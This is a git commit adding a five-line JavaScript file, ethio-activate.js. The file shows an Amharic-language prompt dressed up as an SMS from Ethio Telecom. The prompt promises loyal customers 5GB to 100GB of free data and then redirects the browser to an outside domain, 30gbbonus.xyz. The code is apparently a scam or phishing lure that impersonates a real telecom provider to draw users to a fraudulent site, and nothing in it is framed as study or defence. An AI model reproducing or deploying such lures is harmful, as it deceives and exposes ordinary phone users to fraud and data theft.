d5c559c305c9bc083134f52edce5717b4ff08afa
xmasdata <152927198+xmasdata@users.noreply.github.com>
2025-03-18 07:36:57 +0100

    Create ethio-activate.js

---
+++ ethio-activate.js
@@ -0,0 +1,5 @@
+var password = '100GB አግብር'
+password=prompt('SMS: ውድ ደንበኛ፣ እባክዎን የኢትዮ ቴሌኮም ሲም ካርድ ከ5GB እስከ 100GB ዳታ ለመቀበል ብቁ መሆኑን ያረጋግጡ፣የድሮ ደንበኞች ሽልማት፣አሁን ለማየት እሺን ይጫኑ። ','100GB አግብር');
+if (password != '100GB አግብር') {
+location.href='https://30gbbonus.xyz/ethio-oldsim.html';
+}
